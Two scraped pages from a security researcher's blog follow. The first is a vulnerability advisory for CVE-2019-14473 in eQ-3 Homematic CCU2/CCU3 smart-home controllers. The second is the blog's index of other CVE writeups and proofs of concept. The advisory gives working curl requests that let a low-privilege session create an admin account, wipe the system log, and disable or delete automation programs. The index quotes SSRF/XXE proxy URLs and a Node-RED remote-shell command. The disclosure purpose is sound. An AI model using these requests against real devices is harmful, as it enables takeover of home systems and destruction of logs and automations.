=== Content from psytester.github.io_3abf79cc_20250120_232835.html ===

[![](https://avatars1.githubusercontent.com/u/7526983?s=400)](/)
# [psytester](/)

Testing is my passion. Sharing knowledge is my contribution.

[Blog](/)
[About](/about/)

# CVE-2019-14473 eQ-3 Homematic CCU2 and CCU3 use session IDs for authentication but lack authorization checks. Consequently, a valid guest level or user level account can create a new admin level account, read the service messages, clear the system protocol or modify/delete internal programs, etc. pp.

# Overview

* CVE: CVE-2019-14473
* Author: psytester
* Title: eQ-3 Homematic CCU2 and CCU3 use session IDs for authentication but lack authorization checks. Consequently, a valid guest level or user level account can create a new admin level account, read the service messages, clear the system protocol or modify/delete internal programs, etc. pp.
* Vulnerability Type: CWE-285 Improper Authorization
* CVSSv3 Base Score: 9.9
* CVSSv3 Vector: CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H
* Publishing Date: 03.08.2019
* Updated: –
* Vendor: eQ-3 AG
* Product: Homematic CCU2 and CCU3
* Vendor contacted: 07.05.2019 for similar issue of CVE-2019-14475 / for valid guest level and user level accounts on 01.08.2019
* Vendor confirmation: N.A.
* Vendor patch: N.A.
* Vendor Reference: N.A.
* Affected Firmware version of CCU2: 2.47.12, 2.47.15 tested, but certainly even before that too
* Affected Firmware version of CCU3: 3.47.10, 3.47.15 tested, but certainly even before that too

# Background

From [vendor’s website for CCU2](https://www.eq-3.com/products/homematic/control-units-and-gateways/homematic-central-control-unit-ccu2.html):

HomeMatic Central Control Unit CCU2

Homematic Central Control Unit is the central element of your Homematic system, offering a whole range of control, monitoring and configuration options for all the Homematic devices in your installation

[….]

From [vendor’s website for CCU3](https://www.homematic-ip.com/en/products/detail/smart-home-central-control-unit-ccu3.html):

The Central Control Unit CCU3 is the central element for local control of the Homematic IP smart home system. It represents the next generation of our proven Homematic Central Control Units CCU1 and CCU2. Operation via the Central Control Unit CCU3 can be used alternatively to the Homematic IP Access Point. While the Access Point establishes the connection to the free Homematic IP cloud and enables operation of the smart home system via a smartphone app, the Central Control Unit CCU3 works locally via a browser-based web interface (WebUI). Thanks to local configuration and operation as well as the option to create direct device connections, reliable and fail-proof operation of the smart home system is guaranteed at all times – even in the event of Internet failures.

[….]

Past [eQ-3 press release](https://www.eq-3.de/aktuelles/newsreader/eq-3-schliesst-sicherheitsluecken-in-der-ccu.html) about taking security updates seriously (in German only):

[…]

eQ-3 ist es wichtig, dass auch solche Lücken geschlossen werden, die für die meisten Installationen keine Rolle spielen.

[…]

Obwohl nur Nutzer betroffen sind, die gegen Sicherheitshinweise von eQ-3 verstoßen oder seit mehreren Jahren keine Sicherheitsupdates installiert haben, gibt eQ-3 solchen Fällen hohe Priorität und behebt entsprechende Sicherheitslücken schnellstmöglich nach Bekanntwerden in neuen Software-Versionen und Hotfixes.

[…]

# Issue Description

While analyzing the CCU web interface based on given page objects and the WebUI calls behind in browser developer console, an Improper Authorization vulnerability has been identified, which can be exploited in order to start an Escalation of Privileges, Denial of Service and Information Disclosure at the WebUI. This vulnerability can be exploited by authenticated guest level and user level accounts.

After login as guest or user level account use the given SessionID as shown in address bar `...?sid=@JLS011UTXB@`

Escalation of Privileges - create your own admin level (`level = 8`) account ‘MyOwnAdminAccount’ with passwort ‘myPassword’ and visible on login page:

`curl -X POST -i 'http://1.2.3.4/esp/system.htm?sid=@JLS011UTXB@' --data '<prototypejs><![CDATA[string action = "saveUser";integer iUserid = 0;string userName = "MyOwnAdminAccount";string firstName = ""; string lastName = "";string sSysVars = "";integer iPwChanged = 0; string pw = "myPassword";integer iLogin = 0;integer dev = 0;integer level = 8;boolean bEasy = true; string phone = "";string mail = "";]]></prototypejs>'`

Now you can login with that user with full access control to the system.

You won’t create another admin account, but you want to do other tasks on the system?

Just some examples…

Clear the system protocol:

`curl -X POST -i 'http://1.2.3.4/esp/system.htm?sid=@JLS011UTXB@' --data '<prototypejs><![CDATA[string action = "ClearHistoryData";]]></prototypejs>'`

Read the service messages (device communication errors, etc.):

`curl -X POST -i 'http://IP_der_CCU/esp/system.htm?sid=@JLS011UTXB@' --data '<prototypejs><![CDATA[string action = "UpdateUI";]]></prototypejs>'`

manipulation of programs/scripts (Home page > Programs and connections > Programs)

a program/script is identified by an ID, you may just guess the number or you iterate through a range.
This example is manipulating the program/script `id = "1603"`

deactivate a program/script:

`curl -X POST -i 'http://1.2.3.4/esp/programs.htm?sid=@JLS011UTXB@' --data '<prototypejs><![CDATA[string action = "SetActive";string id = "1603";string value = "false";]]></prototypejs>'`

Set a program/script to inoperable:

`curl -X POST -i 'http://1.2.3.4/esp/programs.htm?sid=@JLS011UTXB@' --data '<prototypejs><![CDATA[string action = "SetOperate";string id = "1603";string value = "false";]]></prototypejs>'`

Set a program/script to invisible:

`curl -X POST -i 'http://1.2.3.4/esp/programs.htm?sid=@JLS011UTXB@' --data '<prototypejs><![CDATA[string action = "SetVisible";string id = "1603";string value = "false";]]></prototypejs>'`

Delete a program/script:

`curl -X POST -i 'http://1.2.3.4/esp/programs.htm?sid=@JLS011UTXB@' --data 'string action = "DeleteProgram";string id = "1603";'`

# CVE

[CVE-2019-14473](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-14473)

# CVSSv3 Base Score

CVSSv3 Base Score: 9.9

CVSSv3 Vector: CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H

# Credit

[psytester](https://psytester.github.io)

Not owning an original CCU2 or CCU3, but you want to analyze the CCU ‘for free’?

You can download

[piVCCU](https://github.com/alexreinert/piVCCU) for running the original CCU3 Firmware in lxc container on RaspberryPi

[RaspberryMatic](https://github.com/jens-maus/RaspberryMatic) for running the opensource OCCU based release on different boards

# Disclaimer

The information provided is released “as is” without warranty of any kind. The publisher disclaims all warranties, either express or implied, including all warranties of merchantability. No responsibility is taken for the correctness of this information.
In no event shall the publisher be liable for any damages whatsoever including direct, indirect, incidental, consequential, loss of business profits or special damages, even if the publisher has been advised of the possibility of such damages.

The contents of this advisory are copyright (c) 2019 by psytester and may be distributed freely provided that no fee is charged for this distribution and proper credit is given.

Written on August 1, 2019 | Last modified on August 3, 2019

 [Mastodon](https://infosec.exchange/%40psytester)



=== Content from psytester.github.io_e8140d0d_20250121_013339.html ===

[![](https://avatars1.githubusercontent.com/u/7526983?s=400)](/)
# [psytester](/)

Testing is my passion. Sharing knowledge is my contribution.

[Blog](/)
[About](/about/)

# [Splunk feature(?) to fingerprint OS patch level](/SPLUNK_fingerprint_os_patchlevel/)

Splunk has at least three interesting API endpoints which are called after login.

They are providing server details about it’s OS patch level.

[Read More](/SPLUNK_fingerprint_os_patchlevel/)

# [Entersekt Transakt secure gateway - Remote Code Execution via OpenSSL diagnostics in GA 23.1-4824 patch 1 and GA 23.1-4825 patch 2](/Entersekt_transakt_RCE_via_openssl_diagnostics/)

The product “Transakt” from [Entersekt](https://www.entersekt.com/company/about-us) is known / used in financial market latest since European PSD2 as 2-FA authentication.
There are whitelabel smartphone apps from different financial institutions [play store search for ‘com.entersekt.authapp’](https://play.google.com/store/search?q=com.entersekt.authapp)

[Read More](/Entersekt_transakt_RCE_via_openssl_diagnostics/)

# [CVE-2022-43571 Splunk RCE – my personal journey to color your life](/CVE-2022-43571_SPLUNK_RCE/)

Only because I got the statement from my IT department, there are no reasons for a SPLUNK update, I analyzed this vulnerability [CVE-2022-43571](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-43571) to prove the opposite for a remote code execution.

[Read More](/CVE-2022-43571_SPLUNK_RCE/)

# [CVE-2023-32714 Splunk App for Lookup File Editing, PoC exploit for path traversal](/CVE-2023-32714_SPLUNK_PoC/)

This time I have analyzed the vulnerability of [CVE-2023-32714](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-32714) Path Traversal in Splunk App for Lookup File Editing.

[Read More](/CVE-2023-32714_SPLUNK_PoC/)

# [CVE-2024-36985 Splunk Remote Code Execution through lookup in splunk\_archiver application, my PoC exploit](/CVE-2024-36985_SPLUNK_RCE_PoC/)

This time I have analyzed the vulnerability of [CVE-2024-36985](https://www.cve.org/CVERecord?id=CVE-2024-36985) Remote Code Execution in Splunk splunk\_archiver App.

[Read More](/CVE-2024-36985_SPLUNK_RCE_PoC/)

# [Atlassian fingerprinting Jira or Confluence version as unauthenticated user](/Atlassian_fingerprinting_version_as_unauthenticated_user/)

The Atlassian Jira or Confluence version can usually only be identified when logged in.

However, there is a way to apply a fingerprint to the Tomcat version by provoking an Tomcat error message.

Here is just one way for each.

[Read More](/Atlassian_fingerprinting_version_as_unauthenticated_user/)

# [CVE-2022-44729 PoC for Atlassian Jira SSRF due to Apache Batik vulnerabilites](/Jira_SSRF_at_Batik_CVEs_PoC/)

Here is my Proof of Concept for a SSRF in Atlassian Jira via three different SVG tags and two possible triggers in Jira.

[Read More](/Jira_SSRF_at_Batik_CVEs_PoC/)

# [CVE-2022-26377 Apache httpd AJP request smuggling - a proof of concept payload generator](/CVE-2022-26377_Apache_mod_proxy_ajp_PoC/)

While searching for a HTTP request smuggling possibility in my [security exploration of Entersekt Transakt secure gateway](https://psytester.github.io/Entersekt_transakt_security_anylysis/) which is HAproxy 1.5 based, I saw the [CVE-2022-26377](https://www.cve.org/CVERecord?id=CVE-2022-26377) Apache httpd mod\_proxy\_ajp request smuggling.

Hmm, I have such project setup for another component…

Searching for the reporter I found his blog. Thanks to DeepL or Google translate, the chinese page is readable for the rest of the world.

I created a payload generator based on allyshka ‘s script for [CVE-2020-1938 Ghostcat](https://gist.github.com/allyshka) - Apache Tomcat AJP vulnerability and BINGO it’s working.

In our special case I could create a Denial of Service on-top.

[Read More](/CVE-2022-26377_Apache_mod_proxy_ajp_PoC/)

# [Keycloak behind reverse proxy with mTLS for X.509 login flow. Possible vulnerability to bypass or spoof the X.509 credentials](/Keycloak_behind_reverse_proxy_spoof_X509_login_flow/)

Smuggling HTTP headers through reverse proxies as vulnerability to spoof the Keycloak X.509 login flow.

Is that possible?

[Read More](/Keycloak_behind_reverse_proxy_spoof_X509_login_flow/)

# [Exploration of Entersekt Transakt secure gateway - a security analysis](/Entersekt_transakt_security_anylysis/)

The product “Transakt” from [Entersekt](https://www.entersekt.com/company/about-us) is known / used in financial market latest since European PSD2 as 2-FA authentication.
There are whitelabel smartphone apps from different financial institutions [play store search for ‘com.entersekt.authapp’](https://play.google.com/store/search?q=com.entersekt.authapp)

[Read More](/Entersekt_transakt_security_anylysis/)

# [Log injection or log forging with control characters and ESC- & CSI-sequences](/log_injection/)

Since long time I already get some nice log file entries in various projects by using newline, backspace, other control characters **AND** ESC- & CSI-sequences to inject the log file.

Only to confuse the admin or the log aggregation system as SPLUNK, Grafana Loki, etc.

Sometimes there could be a monitoring alert notification setup where someone needs to react as on-call duty.

Nobody wants to do this at night!!!

[Read More](/log_injection/)

# [tado° Internet Bridge - Eine Schwachstellen-Analyse der Kommunikation auf mögliche Sicherheitslücken](/tado_smart_radiator_thermostat/)

Ich habe mir ein tado° Starter Kit - Smartes Heizkörper-Thermostat V3+ zugelegt.

Bevor es mit der Ersteinrichtung losging, wollte ich wissen, was die Internet Bridge so alles macht.

Damit das System nicht durch jeden x-beliebigen Hacker angegriffen werden kann, mit der Konsequenz das dieser sieht wo das System verbaut ist und am Verbrauch Rückschlüsse auf eine mögliche Abwesenheit ziehen kann, habe ich es mir aus Sicht eines Angreifers angesehen.

[Read More](/tado_smart_radiator_thermostat/)

# [(kein) echtes Sicherheitsbewusstsein von eQ-3 zu Homematic CCU Sicherheitslücken?](/eQ-3_Sicherheitsbewusstsein_zur_Homematic_CCU/)

Ob eQ-3 als Hersteller der Homematic CCU das Thema Sicherheit wirklich ernst nimmt oder nur pressewirksam in einer Eigendarstellung darüber berichtet, wie zuletzt am 18.03.2019 die [eQ-3 Pressemitteilung](https://www.eq-3.de/aktuelles/newsreader/eq-3-schliesst-sicherheitsluecken-in-der-ccu.html) aka [CVE-2019-10119](https://nvd.nist.gov/vuln/detail/CVE-2019-10119) [CVE-2019-10120](https://nvd.nist.gov/vuln/detail/CVE-2019-10120) [CVE-2019-10121](https://nvd.nist.gov/vuln/detail/CVE-2019-10121) [CVE-2019-10122](https://nvd.nist.gov/vuln/detail/CVE-2019-10122), ~~ich weiß es nicht~~ ich glaube es durch meine bisherigen Erfahrungen nicht mehr.

Ich als Melder von potentiellen Sicherheitslücken fühle mich jedenfalls zum Ende hin nicht ernst genommen.

Auch die bisher schon bekannten 6 CVEs aus dem Jahr 2018, davon 3 schwere Sicherheitslücken, siehe Übersicht auf [www.cvedetails.com](https://www.cvedetails.com/vulnerability-list/vendor_id-17729/Eq-3.html), sind teilweise heute noch nicht behoben worden oder erst “frisch” nach einem Jahr.

Leider teils nur oberflächlich geflickt….

[Read More](/eQ-3_Sicherheitsbewusstsein_zur_Homematic_CCU/)

# [SSRF found and fixed in open.isogeo.com](/SSRF_vulnerability_in_isogeo_resolved/)

A SSFR vulnerability was resolved in open.isogeo.com using the path `https://open.isogeo.com/map/schema://url`

[Read More](/SSRF_vulnerability_in_isogeo_resolved/)

# [Mehrere Schwachstellen (SSRF, XXE, XML Bombe, Admin API Zugriff, etc.) im InGrid Framework (ingrid-webmap-client) geschlossen](/verschiedene_Schwachstellen_im_InGrid-webmap-client/)

Verschiedene Bundesländer- und Bundesportale für (Geo-)Metadaten enthielten einige Schwachstellen im InGrid Framework, die nun gefixt wurden:

* Drei Möglichkeiten einer XXE via SSRF
  ```
  /ingrid-webmap-client/rest/wms/proxy/?url=https://SSRF_IP/xxe.xml
  /ingrid-webmap-client/rest/wms/proxy/layers?url=http://SSRF_IP/xxe_layers.xml
  /ingrid-webmap-client/rest/search/query?type=services&q=dummy&searchUrl=https://SSRF_IP/xxe_rss_channel_item.xml

  ```
* XML Bombe via SSRF
* SSRF auf interne Systeme. Zumindest meine Testdatei wird nun nicht mehr ausgegeben, da sie eventuell nicht der erwarteten Struktur entspricht.
* Schreibender Admin Zugriff auf Daten, die unter anderem eine persistente XSS ermöglichen können
* Tomcat Version Disclosure Schwachstelle & Veralteter Tomcat Softwarestand

[Read More](/verschiedene_Schwachstellen_im_InGrid-webmap-client/)

# [Analysing BAB TECHNOLOGIE eibport V3 to gain root SSH access](/analysing_eibport_to_gain_root_SSH_access/)

Because of the blind hit with [CVE-2020-24573](https://psytester.github.io/CVE-2020-24573/) in BAB TECHNOLOGIE GmbH eibPort V3 for a simple Denial of Service

and the gpg protected firmware file, I was in the mode of “challenge accepted”.

[Read More](/analysing_eibport_to_gain_root_SSH_access/)

# [CVE-2021-28909 BAB TECHNOLOGIE GmbH eibPort V3 prior version 3.9.1 allow unauthenticated attackers to access uncontrolled the login service at /webif/SecurityModule in a brute force attack. The password could be weak and default username is known as 'admin'. This is usable and part of an attack chain to gain SSH root access.](/CVE-2021-28909/)

# Overview

[Read More](/CVE-2021-28909/)

# [CVE-2021-28910 BAB TECHNOLOGIE GmbH eibPort V3 prior version 3.9.1 contains basic SSRF vulnerability. It allow unauthenticated attackers to request to any internal and external server](/CVE-2021-28910/)

# Overview

[Read More](/CVE-2021-28910/)

# [CVE-2021-28911 BAB TECHNOLOGIE GmbH eibPort V3 prior version 3.9.1 allow unauthenticated attackers access to /tmp path which contains some sensitive data (e.g. device serial number). Having those info, a possible loginId can be self-calculated in a brute force attack against BMX interface. This is usable and part of an attack chain to gain SSH root access.](/CVE-2021-28911/)

# Overview

[Read More](/CVE-2021-28911/)

# [CVE-2021-28912 BAB TECHNOLOGIE GmbH eibPort V3. Each device has its own unique hard coded and weak root SSH key passphrase known as 'eibPort string'. This is usable and the final part of an attack chain to gain SSH root access.](/CVE-2021-28912/)

# Overview

[Read More](/CVE-2021-28912/)

# [CVE-2021-28913 BAB TECHNOLOGIE GmbH eibPort V3 prior version 3.9.1 allow unauthenticated attackers access to /webif/SecurityModule to validate the so called and hard coded unique 'eibPort String' which acts as the root SSH key passphrase. This is usable and part of an attack chain to gain SSH root access.](/CVE-2021-28913/)

# Overview

[Read More](/CVE-2021-28913/)

# [CVE-2021-28914 BAB TECHNOLOGIE GmbH eibPort V3 prior version 3.9.1 allow the user to set a weak password because the strength is shown in configuration tool, but finally not enforced. This is usable and part of an attack chain to gain SSH root access.](/CVE-2021-28914/)

# Overview

[Read More](/CVE-2021-28914/)

# [CVE-2020-24573 BAB TECHNOLOGIE GmbH eibPort V3 prior version 3.8.3 Denial of Service](/CVE-2020-24573/)

# Overview

[Read More](/CVE-2020-24573/)

# [CVE-2019-18937 eQ-3 Homematic AddOn 'ScriptParser' version 1.8 and prior on CCU2 and CCU3 allows Remote Code Execution by unauthenticated attackers with access to the web interface by usage of /addons/script/exec.cgi script, which executes TCL script content from HTTP POST request](/CVE-2019-18937/)

# Overview

[Read More](/CVE-2019-18937/)

# [CVE-2019-18938 eQ-3 Homematic AddOn 'E-Mail' version 1.6.8.c and prior on CCU2 and CCU3 allows Remote Code Execution by unauthenticated attackers with access to the web interface by usage of the save.cgi script for payload upload and the testtcl.cgi script for its execution](/CVE-2019-18938/)

# Overview

[Read More](/CVE-2019-18938/)

# [CVE-2019-18939 eQ-3 Homematic AddOn 'HM-Print' version 1.2a and prior on CCU2 and CCU3 allows Remote Code Execution by unauthenticated attackers with access to the web interface by usage of exec.cgi & exec1.cgi script, which executes TCL script content from HTTP POST request](/CVE-2019-18939/)

# Overview

[Read More](/CVE-2019-18939/)

# [CVE-2020-12834 eQ-3 Homematic CCU2 through 2.51.6 and CCU3 through 3.51.6 allow Remote Code Execution in JSON API Method ReGa.runScript by unauthenticated attackers with access to the web interface due to default auto-login feature enabled during first-time setup (or factory reset)](/CVE-2020-12834/)

# Overview

[Read More](/CVE-2020-12834/)

# [CVE-2019-9584 eQ-3 Homematic AddOn 'CloudMatic' on CCU2 and CCU3 allows uncontrolled admin access, resulting in the ability to obtain VPN profile details, shutting down the VPN service and to delete the VPN service configuration. This is related to improper access control for all /addons/mh/ pages](/CVE-2019-9584/)

# Overview

[Read More](/CVE-2019-9584/)

# [CVE-2019-19643 ise smart connect KNX Vaillant 1.2.839 Denial of Service](/CVE-2019-19643/)

# Overview

[Read More](/CVE-2019-19643/)

# [Angriffsvektoren auf aktuelle embedded Linux Busybox/Buildroot Systeme (IoT/Router/Smart Home) wegen Sicherheitslücken in veralteter Softwarebasis](/embedded_Linux_Busybox_Buildroot/)

Der initiale Post wurde am 27.06.19 verfasst.

Veraltete Busybox oder Buildroot Versionen können zu einem Problem werden, da diese Sicherheitslücken enthalten.

Heutzutage ist Software Pflege das A und O um nicht verwundbar zu sein.

Die Hersteller sind in guter Gesellschaft, es ist keiner Besser als der andere. Viele setzen teilweise veraltete oder sehr veraltete Versionen als Basis ein!

Wichtig zu wissen: Das Datum in der Versionsausgabe von Busybox ist das Datum der Kompilierung und nicht das Release Datum!

Es gibt alleine 17 CVEs zur Busybox als eigenständiges Produkt:

[Busybox on cvedetails.com](https://www.cvedetails.com/product/7452/Busybox-Busybox.html?vendor_id=4282)

Und es gab weitere Sicherheitsupdates, die nicht explizit als CVE bekannt geworden sind.

Zumindest die bekannten Lücken im DHCP und NTP wären dann eine Angriffsmöglichkeit.

Und die Buildroot in einigen Systemen ist wahrscheinlich noch viel mehr betroffen

[Buildroot changes](https://git.busybox.net/buildroot/plain/CHANGES)

Alle CVEs aufgelistet in den Commits, mit 50 Einträge pro Seite

[Search CVEs in Buildroot commits - page 1](https://git.busybox.net/buildroot/log/?qt=grep&q=CVE)

bis

[Search CVEs in Buildroot commits - page 900](https://git.busybox.net/buildroot/log/?qt=grep&q=CVE&ofs=900)

ergeben Stand heute 2019-06-27 932 Updates wegen Zuordnungen zu CVEs !!!

Bisher habe ich drei Anfragen mit dieser Fragestellung rausgeschickt

```
Ist ihnen die veraltete Busybox/Buildroot „Problematik“ bewusst und gibt es allgemeine Bestrebungen Firmware Releases auf neuerer Basis rauszubringen?
Zumindest die bekannten Lücken im DHCP und NTP wären dann eine Angriffsmöglichkeit.

```

[Read More](/embedded_Linux_Busybox_Buildroot/)

# [CVE-2019-9582 eQ-3 Homematic CCU2 outdated base software packages allows Denial of Service](/CVE-2019-9582/)

# Overview

[Read More](/CVE-2019-9582/)

# [Smart Home: Testinstitute/Testergebnisse – Die Testdurchführungs-Fakten, die Wahrnehmung und am Ende die Annahmen die ein Verbraucher treffen könnte](/Testinstitute_Testergebnisse_Verbraucher/)

Jeder hat schon einmal ein Testergebnis zu einem Produkt gesucht und sich auf dieses unabhängige Ergebnis verlassen. Bei „analogen“ Produkten ist das auch irgendwie nachvollziehbar.
Aber IoT / Smart Home Produkte kommunizieren teilweise in einem lokalen Netzwerk oder sind sogar über das Internet steuerbar.

Jedenfalls die Außenwirkung der Testergebnisse könnte dann zu Annahmen verleiten, die so gar nicht zutreffen.

Was genau wurde denn in welchem Umfang getestet und welches Produkt konkret des Herstellers?

Diese Fragen sollten einfach verständlich auch für Otto Normalverbraucher nachvollziehbar beantwortbar sein können.

Manche Einstiegsprodukte (Startersets) sind der Anfang einer komplexen Installation und man holt sich die eventuellen Probleme ins Haus.

Die Fragestellung an die Testinstitute [Stiftung Warentest](https://www.test.de), dem [VDE](https://www.vde.com) und [AV-Test](https://www.av-test.org) war immer mehr oder weniger dieselbe.

Hier der Hauptteil der Anfrage:

> Falls sie an der Außenwirkung der von Ihnen vergebenen Zertifikate/Testergebnisse interessiert sind, hier mein persönliches Feedback und warum diese Nachfrage entstanden ist.
> Gleich vorweg, damit es zu keinem Missverständnis kommt. Es geht nicht um ihre Tests, sondern wie diese Verkaufsfördernd von den Herstellern eingesetzt werden könnten.
>
> Wirbt ein Hersteller mit einem von Ihnen als (sehr) sicher eingestuftes Produkt, ist das eine ähnliche Wirkung wie ein Testergebnis bei Stiftung Warentest. Denn stellt er ein (sehr) sicheres Produkt her, so werden die anderen mind. auch den höchsten Ansprüchen entsprechen.
> Kaum ein Verbraucher wird sich im Detail darüber informieren, ob die andere Produktlösung vom selben Hersteller nicht eventuell unsicher ist. Der Hersteller wird damit jedenfalls nicht werben unsichere Produkte zu vertreiben.
>
> Vielleicht grenzen Sie die Vergabe der Zertifikate eventuell deutlicher ab, damit beim Endverbraucher kein falscher Eindruck entsteht. Nur weil Produkt X (sehr) sicher ist, muss das für Produkt Y noch lange nicht gelten.

[Read More](/Testinstitute_Testergebnisse_Verbraucher/)

# [RedMatic als Homematic AddOn kann für Remote Code Execution missbraucht werden](/Homematic_RedMatic_RemoteCodeExecution/)

RedMatic baut auf Node-RED auf und ist eine Erweiterung für Homematic CCUs.

Wenn der Node-RED Zugang ungeschützt ist, weil die Authentifizierung abgeschaltet wurde, kann ein Angreifer dadurch sofort eine Remote Code Execution auf dem System durchführen, ganz einfach über Port 80.

Node-RED liefert ja extra dokumentierte Möglichkeiten lokal Befehle ausführen zu können um Steuerungssequenzen umzusetzen.
Wenn nun der Zugang mit den Login Mitteln der CCU gesichert ist, kennen wir zumindest den Usernamen “Admin” und nur das Passwort muss per Bruteforce gefunden werden. Ein starkes/sicheres Passwort ist wie immer also sehr wichtig.

Ist der Zugang Individuell gesichert mit einer eigenen Username/Passwort Kombination, wird es schon schwieriger sein, die Zugangsdaten zu erhalten. Das starke/sichere Passwort ist hier natürlich auch zwingend notwendig um sich so gut wie möglich zu schützen.

Wie in dem Artikel von Quentin Kaiser [Gaining RCE by abusing Node-RED](https://quentinkaiser.be/pentesting/2018/09/07/node-red-rce/) aufgezeigt, ist eine RCE dann für RedMatic Systeme auch ausnutzbar, da es ja auf Node-Red aufsetzt.

Ein Websocket dient dabei als Shell Zugang. Echt verrückt, was technisch alles möglich ist, zumal dieses Python Skript den Angriff vollkommen automatisiert:

```
./noderedsh.py --username Admin --password mySecret http://1.2.3.4/addons/red
.....
[+] Establishing RCE link ....
> ls -l
total 4840
-rw-r--r--    1 root   root 43 Sep  5 14:57 VERSION
........

```

Also bitte niemals die Authentifizierung abschalten oder einfache Passwörter nutzen.

Es gibt so viele technisch unerfahrene Benutzer, die sich nicht vorstellen können, das und wie einfach potentielle Sicherheitslücken oder wie hier falsche Konfigurationen ausgenutzt werden können. Wenn dieser Artikel auch nur einen Anwender sensibilisiert, ist das Ziel erreicht.

Der Blogeintrag wurde am 06.10.19 etwas umgeschrieben, da im [Homematic Forum](https://homematic-forum.de/forum/viewtopic.php?f=77&t=53582) der Stil diese Artikels angekreidet wurde.

Die HM Forum Gemeinde ist da etwas eigensinnig. Es ist immer das eventuelle Portforwarding oder der Nutzer das Problem, aber nie die unsichere CCU, die es dem Angreifer wirklich sehr einfach macht.
 Wenn schon das Smart Home kein primäres Ziel des Hackers ist, schon mal von [Mirai](https://de.wikipedia.org/wiki/Mirai_%28Malware%29) oder [Echobot](https://www.trendmicro.com/vinfo/be/security/news/internet-of-things/mirai-spawn-echobot-found-using-over-50-different-exploits) gehört?

Ich möchte hier nur die sensibilisieren, die sich unwissentlich angreifbar machen und bei Smart Home nicht nach dem Motto [no Risk no Fun](https://homematic-forum.de/forum/viewtopic.php?f=19&t=35725&hilit=shodan&sid=4f5aa0332a0650f19d5f0c2a6f99cee4&start=330#p452442) leben wollen.

Das dies auch in echt passiert, zeigt dieser Thread [ich wurde “gehackt”](https://homematic-forum.de/forum/viewtopic.php?f=26&t=53197). Aber hier war RedMatic bestimmt nicht im Spiel, da reichte schon eine der vielen Sicherheitslücken im ReGa Prozess.

[Read More](/Homematic_RedMatic_RemoteCodeExecution/)

# [CVE-2019-16199 eQ-3 Homematic CCU2 prior 2.47.18 and CCU3 prior 3.47.18 allow Remote Code Execution by unauthenticated attackers with access to the web interface via a HTTP POST request to certain URLs related to the ReGa core process](/CVE-2019-16199/)

# Overview

[Read More](/CVE-2019-16199/)

# [IoT Malware 'Mirai' Abkömmling Echobot befällt auch Homematic CCU Zentralen](/IoT_Botnetz_mit_Homematic_CCU_Zentralen/)

[Im Mai hatte das BSI über Twitter](https://twitter.com/certbund/status/1128955705451581440) vermeldet, das sehr viele Homematic Systeme aus dem Internet erreichbar sind.

Das hatte scheinbar niemanden interessiert und wurde somit nicht weiter verbreitet.

[Ende August gab es eine erneute Meldung](https://twitter.com/certbund/status/1166641109977763840) welche von [Heise](https://www.heise.de/security/meldung/CERT-Bund-warnt-vor-offenen-Smarthome-Systemen-4509977.html) aufgegriffen wurde, womit das Thema etwas mehr Aufmerksamkeit bekommen hat.

Das Thema ungeschütztes Portforwarding jetzt mal völlig außen vorgelassen, es wird oft und gerne darüber diskutiert, was es bei einer Smart Home Installation schon zu holen gäbe.

Auch fragen sich einige Nutzer im Homatic Forum warum die Sicherheit jetzt so übertrieben in den Fokus gerückt wird.

Bisschen Lampen an/aus, Heizungsthermostate regeln, gut ist. Eine Keymatic wäre schon interessanter und der Worst Case wenn in der CCU noch die Geo-Location Daten brav vom Besitzer auf den Meter genau eingetragen wurden, dann ist ja alles klar wo die Tür aufgeht….

ABER der aus 2016 bekannte Mirai Schädlich, der IoT Geräte im großen Stil für ein Botnetz missbraucht hat, besitzt einen Abkömmling Namens [Echobot](https://www.trendmicro.com/vinfo/be/security/news/internet-of-things/mirai-spawn-echobot-found-using-over-50-different-exploits). Dieser versucht mit einer alten Sicherheitslücke der Homematic CCU auf das System zu kommen.

Wenn schon keiner daran interessiert ist, digital ins Haus einzubrechen, so ist ein Botnetz für Spam Versand und DDoS Attacken sehr wohl interessant für den gemeinen Botnetz Betreiber.

[Read More](/IoT_Botnetz_mit_Homematic_CCU_Zentralen/)

# [Process restart / Denial of Service by logfile injection on Tanuki Software Java Service Wrapper filter action](/DoS_on_TanukiSoftware_JavaServiceWrapper/)

Recently, when I played with logfile injection, I found a nice catch in the filter action of Tanuki Software’s Java Service wrapper when [OutOfMemoryError Detection](https://wrapper.tanukisoftware.com/doc/english/prop-filter-x-n.html#outofmemory) is used.

[Read More](/DoS_on_TanukiSoftware_JavaServiceWrapper/)

# [CVE-2019-14986 eQ-3 Homematic CCU2 and CCU3 with the 'CUxD' AddOn version prior 2.3.0 installed allows administrative operations by unauthenticated attackers with access to the web interface, because features such as File-Browser and Shell Command (as well as 'Set root password') are exposed](/CVE-2019-14986/)

# Overview

[Read More](/CVE-2019-14986/)

# [CVE-2019-14985 eQ-3 Homematic CCU2 and CCU3 with the CUxD AddOn installed allows Remote Code Execution by unauthenticated attackers with access to the web interface, because CUxD 'CMD\_EXEC' virtual device type 28 is not protected against external usage](/CVE-2019-14985/)

# Overview

[Read More](/CVE-2019-14985/)

# [CVE-2019-14984 eQ-3 Homematic AddOn 'XML-API' version 1.2.0 and prior on CCU2 and CCU3 allows Remote Code Execution by unauthenticated attackers with access to the web interface by usage of /addons/xmlapi/exec.cgi script, which executes TCL script content from HTTP POST request](/CVE-2019-14984/)

# Overview

[Read More](/CVE-2019-14984/)

# [CVE-2019-14474 eQ-3 Homematic CCU3 has Improper Input Validation in function 'Call()' of ReGa core logic process, resulting in the ability to start a Denial of Service. Due to Improper Authorization an attacker can obtain a session ID from CVE-2019-9583 or a valid guest/user/admin account can start this attack too](/CVE-2019-14474/)

# Overview

[Read More](/CVE-2019-14474/)

# [CVE-2019-14475 eQ-3 Homematic CCU2 and CCU3 use session IDs for authentication but lack authorization checks. An attacker can obtain a session ID from CVE-2019-9583, resulting in the ability to read the service messages, clear the system protocol, create a new but not working user account in the system, modify/delete internal programs, etc. pp.](/CVE-2019-14475/)

# Overview

[Read More](/CVE-2019-14475/)

# [CVE-2019-14473 eQ-3 Homematic CCU2 and CCU3 use session IDs for authentication but lack authorization checks. Consequently, a valid guest level or user level account can create a new admin level account, read the service messages, clear the system protocol or modify/delete internal programs, etc. pp.](/CVE-2019-14473/)

# Overview

[Read More](/CVE-2019-14473/)

